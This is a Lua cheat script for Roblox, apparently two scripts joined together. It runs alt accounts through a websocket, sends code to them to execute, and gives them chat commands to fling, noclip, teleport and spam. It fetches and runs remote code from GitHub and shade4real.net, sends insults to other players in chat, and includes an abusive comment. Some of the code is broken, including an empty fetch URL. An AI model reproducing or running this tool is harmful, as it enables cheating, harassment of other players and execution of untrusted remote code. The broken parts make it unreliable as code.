repeat wait() until game:IsLoaded()
local role = ""

if game.Players.LocalPlayer.Name ~= getgenv().main then
    role = "follower"
else
    role = "host"
end




local runService = game:GetService("RunService")

local eventLogs = {}



local function createDrawing(type, prop)
   local obj = Drawing.new(type)
   if prop then
       for i,v in next, prop do
           obj[i] = v
       end
   end
   return obj
end


function createEventLog(text)
   local eventLog = {
       text = text,
       startTick = tick(),
       lifeTime = 5,
       shadowText = createDrawing("Text", {
           Center = false,
           Outline = false,
           Color = Color3.new(),
           Transparency = 200/255,
           Text = text,
           Size = 13,
           Font = 2,
           Visible = false
       }),
       mainText = createDrawing("Text", {
           Center = false,
           Outline = false,
           Color = Color3.new(1, 1, 1),
           Transparency = 1,
           Text = text,
           Size = 13,
           Font = 2,
           Visible = false
       })
   }

   function eventLog:Destroy()
       local shadowTextOrigin = self.shadowText.Position
       local mainTextOrigin = self.mainText.Position
       local shadowTextTrans = self.shadowText.Transparency
       local mainTextTrans = self.mainText.Transparency
       for i = 0, 1, 1/60 do
           self.shadowText.Position = shadowTextOrigin:Lerp(Vector2.new(), i)
           self.mainText.Position = mainTextOrigin:Lerp(Vector2.new(), i)
           self.shadowText.Transparency = shadowTextTrans * (1 - i)
           self.mainText.Transparency = mainTextTrans * (1 - i)
           runService.RenderStepped:Wait()
       end
       self.mainText:Remove()
       self.shadowText:Remove()
       self.mainText = nil
       self.shadowText = nil
       table.clear(self)
       self = nil
   end


   table.insert(eventLogs, eventLog)
   return eventLog
end




runService.RenderStepped:Connect(function(deltaTime)
   local count = #eventLogs
   local removedFirst = false
   for i = 1, count do
       local curTick = tick()
       local eventLog = eventLogs[i]
       if eventLog then
           if curTick - eventLog.startTick > eventLog.lifeTime then
               task.spawn(eventLog.Destroy, eventLog)
               table.remove(eventLogs, i)
           elseif count > 10 and not removedFirst then
               removedFirst = true
               local first = table.remove(eventLogs, 1)
               task.spawn(first.Destroy, first)
           else
               local previousEventLog = eventLogs[i - 1]
               local basePosition
               if previousEventLog then
                   basePosition = Vector2.new(4, previousEventLog.mainText.Position.y + previousEventLog.mainText.TextBounds.y + 1)
               else
                   basePosition = Vector2.new(4, 320)
               end
               eventLog.shadowText.Position = basePosition + Vector2.new(1, 1)
               eventLog.mainText.Position = basePosition
               eventLog.shadowText.Visible = true
               eventLog.mainText.Visible = true
           end
       end
   end
end)

getgenv().createEventLog = createEventLog




printconsole("bot server executed")

local onhost = "in|"..game.Players.LocalPlayer.Name.."|"..game.PlaceId.."|"..game.JobId



printconsole(role)

local eventCodes = {
    ["1"]  = "on-route",
    ["2"]  = "couldn't join",
    ["3"]  = "server full",
    ["in"] = "in server"
}





local websocket = syn.websocket.connect("ws://localhost:3000")
websocket:Send("newcon")
createEventLog("successfully connected to websocket!")
createEventLog("current role: "..role)

-- host stuff

if role == "host" then
    websocket:Send("in|"..game.Players.LocalPlayer.Name.."|"..game.PlaceId.."|"..game.JobId)
    createEventLog("sent server id to websocket...")
end

if role == "host" then
    websocket.OnMessage:Connect(function(msg)
        local params = string.split(msg, "|")
        if params[1] == "1" and not game.Players:FindFirstChild(params[2]) then
            createEventLog(params[2].." on route to "..game:GetService("MarketplaceService"):GetProductInfo(tonumber(params[3])).Name.." ("..params[4]..")")
        end
    end)
    websocket.OnMessage:Connect(function(msg)
        if msg == "newcon" then
            createEventLog("new connection to websocket...")
            wait(3)
            websocket:Send(onhost)
            createEventLog("sent server id to websocket!")
        end
    end)
    
    websocket.OnMessage:Connect(function(msg)
        local params = string.split(msg, "|")
        if params[1] == "main is in server, not switching servers" then
            createEventLog(params[2].." is now in your game!")
            websocket:Send("exec|"..readfile("goopysbotserver/script.lua"))
        end
    end)
    
    websocket.OnMessage:Connect(function(msg)
        local params = string.split(msg, "|")
        if params[1] == "executed" then
            createEventLog(params[2].." injected and executed!")
        end
    end)
end

-- host end

-----------------------------------------------------------------------------------

-- follower stuff

if role == "follower" then
    websocket.OnMessage:Connect(function(msg)
        local params = string.split(msg, "|")
        if params[1] == "in" then
            websocket:Send("1|"..game.Players.LocalPlayer.Name.."|"..params[3].."|"..params[4])
            printconsole("game:GetService('TeleportService'):Teleport("..tonumber(params[3])..", "..params[4]..", game.Players.LocalPlayer)")
            if game.Players:FindFirstChild(getgenv().main) then
                websocket:Send("main is in server, not switching servers|"..game.Players.LocalPlayer.Name)
            else
                game:GetService('TeleportService'):TeleportToPlaceInstance(tonumber(params[3]), params[4], game.Players.LocalPlayer)
            end
        end
    end)
end

spawn(function()
    if role == "follower" then
	loadstring(game:HttpGet(""))
    end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/thekura312/effective-doodle/main/control.lua"))

-- follower end

-- 🤓・For you skids
-- We all know you cant code for shit but skidding peoples hard work, is
-- just not it 
--I hope you end up on the streets begging for spare change

------------------------important varibles------------------------------------------------------------

rbxname = "kama2137324"
local prefix = ":"
local LPlayer = game.Players.kama2137324 -- your name on my name (maxbrh1)
messageLL = "kama2137324 on top" 
speed = 1 --how fast tweengoto is 
render1 = false --if alts auto unrender when excuted
resettime = 5.4 --how long it will take to teleport alts back to cordinates noclip command

---------------------commands--------------------------------------------------------------------------
--tp teleports alts to you
--msg says message
--sit sits alts
--unsit unsits alts
--rs resets alts
--fling excutes fling scripts on alts remeber to use account for lag
--leave makes alts leave 
--float floats alts
--unfloat unfloats alts
--say makes alts say message
--tweengoto makes alt tween to player
--noclip phase trugh walls
--unclip no noclip
--roast roast people with custum text 
--love Love and compliments

---------------grapics commands-------------------------------------------------------------------------

--gr1 reduces grapics on alts more cpu power and gpu
--gr2 same as gr1 just much more 
--fpscap - number fps cap 
--unrender REALLY good for performance 
--render renders 
--checkmin checks if you have minimezed tabs

--------------------------------------------------------------------------------------------------------

LPlayer.Chatted:Connect(function(msg)
	msg = msg:lower()
	if string.sub(msg,1,3) == "/e " then
		msg = string.sub(msg,4)
	end
	if string.sub(msg,1,1) == prefix then
		local cmd
		local space = string.find(msg," ")
		if space then
			cmd = string.sub(msg,2,space-1)
		else
			cmd = string.sub(msg,2)
		end
		
--------------------------------commands scripts----------------------------------------------------------
		
		if cmd == "tp" then
		    local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = rbxname
local pos = p1.CFrame

p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
	end

		if cmd == "msg" then
		    local args = {
			[1] = messageLL,
			[2] = "All"
		}

		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	end
		if cmd == "sit" then
		    game.Players.LocalPlayer.Character.Humanoid.Sit = true
    end
		if cmd =="unsit" then
		    game.Players.LocalPlayer.Character.Humanoid.Sit = false
    end 
		if cmd == "rs" then
		    game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end
		if cmd == "fling" then
		    loadstring(game:HttpGet('https://files.shade4real.net/flinger.txt'))()
    end
		if cmd == "leave" then
		    game:Shutdown()
    end
        if cmd == "float" then
            for i, player in ipairs(game.Players:GetPlayers()) do -- use GetPlayers()
        player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0))
    end
wait(0.2)
game.Players.LocalPlayer.Character.Head.Anchored = true
    end
        if cmd == "unfloat" then
            	    for i, player in ipairs(game.Players:GetPlayers()) do -- use GetPlayers()
        player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0))
    end
wait(0.2)
game.Players.LocalPlayer.Character.Head.Anchored = false
    end
        if cmd == "say" then
            		if cmd == "say" then
            		    local var = string.sub(msg,space+1)
		                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(var, "All")
    end
    end
        if cmd == "tweengoto" then
		    local var1 = string.sub(msg,space+1)
		    local target = GetPlayer(var1)
		    local cords = target.Character.HumanoidRootPart.Position
		    
	        local New_CFrame = CFrame.new(cords)
		    
		    local ts = game:GetService('TweenService')
            local char = game.Players.LocalPlayer.Character
            
            local part = char.HumanoidRootPart
            local ti = TweenInfo.new(speed, Enum.EasingStyle.Linear)
            local tp = {CFrame = New_CFrame}
            ts:Create(part, ti, tp):Play()
    end
        if cmd== "noclip" then
            local noclip = true char = game.Players.LocalPlayer.Character while true do if noclip == true then for _,v in pairs(char:children()) do pcall(function() if v.className == "Part" then v.CanCollide = false elseif v.ClassName == "Model" then v.Head.CanCollide = false end end) end end game:service("RunService").Stepped:wait() end
    end
        if cmd == "unclip" then
            local cords2 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
            wait(resettime)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(cords2)
    end
        if cmd == "roast" then
            local Roast = {"You bring everyone so much joy! You know, when you leave the room. But, still",
            "If your brain was dynamite, there wouldn’t be enough to blow your hat off.",
            "You are like a cloud. When you disappear, it’s a beautiful day.",
            "I thought of you today. It reminded me to take out the trash.",
            "Don’t be ashamed of who you are. That’s your parent’s job.",
            "You’re my favorite person… besides every other person I’ve ever met.",
            "You are proof that evolution can go in reverse.",
            "If I throw a stick, will you leave?",
            "Were you born this stupid or did you take lessons?",
            "You are proof that god has a sense of humour.",
            "if i had a face like yours, id sue my parents",
            "If I had a dollar every time you shut up, I would give it back as a thank you.",
            "Yes, I’m fully vaccinated, but I will still not hang out with you.",
            "Earth is full. Go home.",
            "A glowstick has a brighter future than you. Lasts longer in bed, too.",
            "Taking a picture of you would put a virus on my phone",
            }

            local Result = Roast[math.random(1, #Roast)]
            game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Result,"All")
    end
        if cmd == "love" then
            local love = {"You just light up the room.",
            "You are more fun than anyone or anything I know, including bubble wrap.",
            "Your inside is even more beautiful than your outside.",
            "You inspire me.",
            "You are the reason I am smiling today.",
            "I bet you make small animals happy.",
            "Colors seem brighter when you're around.",
            "Your eyes are breathtaking.",
            "On a scale from 1 to 10, you're an 11.",
            "You are an incredible human.",
            "Thank you for being you.",
            }

            local Result1 = love[math.random(1, #love)]
            game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Result1,"All")
    end


-----------------------------grapics scripts-----------------------------------------------------------------------------------
if cmd == "gr1" then
    local a = game

local b = a.Workspace

local c = a.Lighting

local d = b.Terrain

d.WaterWaveSize = 0

d.WaterWaveSpeed = 0

d.WaterReflectance = 0

d.WaterTransparency = 0

c.GlobalShadows = false

c.FogEnd = 9e9

c.Brightness = 0

settings().Rendering.QualityLevel = "Level01"

for e, f in pairs(a:GetDescendants()) do

if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then

f.Material = "Plastic"

f.Reflectance = 0

elseif f:IsA("Decal") or f:IsA("Texture") then

f.Transparency = 0

elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then

f.Lifetime = NumberRange.new(0)

elseif f:IsA("Explosion") then

f.BlastPressure = 0

f.BlastRadius = 0

elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then

f.Enabled = false

elseif f:IsA("MeshPart") then

f.Material = "Plastic"

f.Reflectance = 0

f.TextureID = 10385902758728957

end

end

for e, g in pairs(c:GetChildren()) do

if

g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or

g:IsA("DepthOfFieldEffect")

then

g.Enabled = false

end

end

sethiddenproperty(game.Lighting, "Technology", "Compatibility")
end



if cmd == "gr2" then
    for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.BrickColor = BrickColor.new(155, 155, 155)
v.Material = "Plastic"
end
end

for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Decal"
or v.ClassName == "Texture" then
v:Destroy()
end
end
end

------------------------------------------------check minimezed -----------------------------------------------------------------

if cmd == "checkmin" then
    local ScreenGuirtw = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")

--Properties:

ScreenGuirtw.Name = "ScreenGuirtw"
ScreenGuirtw.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGuirtw.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGuirtw
Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame.Position = UDim2.new(0.295296818, 0, 0.243119255, 0)
Frame.Size = UDim2.new(0, 531, 0, 335)

TextLabel.Parent = ScreenGuirtw
TextLabel.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
TextLabel.Position = UDim2.new(0.356977642, 0, 0.370030582, 0)
TextLabel.Size = UDim2.new(0, 370, 0, 170)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "NOT MINIMIZED"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 60.000



wait (8)
game:GetService("Players").LocalPlayer.PlayerGui.ScreenGuirtw:Destroy()
end

----------------------------------------------fpscap-----------------------------------------------------------------------------

if cmd == "fpscap" then
    local cap = string.sub(msg,space+1)
    	    local fps = cap
local clock = tick()

while true do
    while clock + 1/fps > tick() do end
    wait()
    clock = tick()
    end
    end

-------------------------------------render / unrender------------------------------------------------------------------------------

if cmd == "unrender" then
    game:GetService("RunService"):Set3dRenderingEnabled(false)
    end

if cmd == "render" then
    game:GetService("RunService"):Set3dRenderingEnabled(true)
    end

----------------------------------------------player thing--------------------------------------------------------------------------
function GetPlayer(String)
    local plr
    local strl = String:lower()
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                plr = v
            end 
        end
        if String == "me" then
                plr = game.Players.LocalPlayer
            end
        if String == "" or String == " " then
           plr = nil
        end
    return plr
end

	end
end)
------------------------------------------------------automatic excutes--------------------------------------------------------------
if render1 == true then
    game:GetService("RunService"):Set3dRenderingEnabled(false)
    end

-------------------------------------------------------------------------------------------------------------------------------------

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Notification";
	Text = "maxbrh2#9353";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 16;
